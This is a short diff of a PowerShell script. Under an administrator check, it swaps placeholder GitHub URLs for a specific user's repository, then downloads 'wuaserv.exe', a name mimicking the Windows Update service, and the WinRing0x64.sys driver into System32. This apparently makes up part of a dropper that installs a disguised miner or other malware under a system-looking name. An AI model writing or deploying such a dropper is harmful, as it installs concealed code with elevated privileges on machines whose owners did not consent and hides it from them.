@@ -6,8 +6,8 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 # Define paths
 $sysDir = "$env:SystemRoot\System32"
 $urls = @{
-    "wuaserv.exe" = "https://github.com/username/repo/raw/main/wuaserv.exe"
-    "WinRing0x64.sys" = "https://github.com/username/repo/raw/main/WinRing0x64.sys"
+     "wuaserv.exe" = "https://github.com/al0nks1337/wuaserv/raw/refs/heads/main/wuaserv.exe"
+     "WinRing0x64.sys" = "https://github.com/al0nks1337/wuaserv/raw/refs/heads/main/WinRing0x64.sys"
 }
 
 # Clean old files
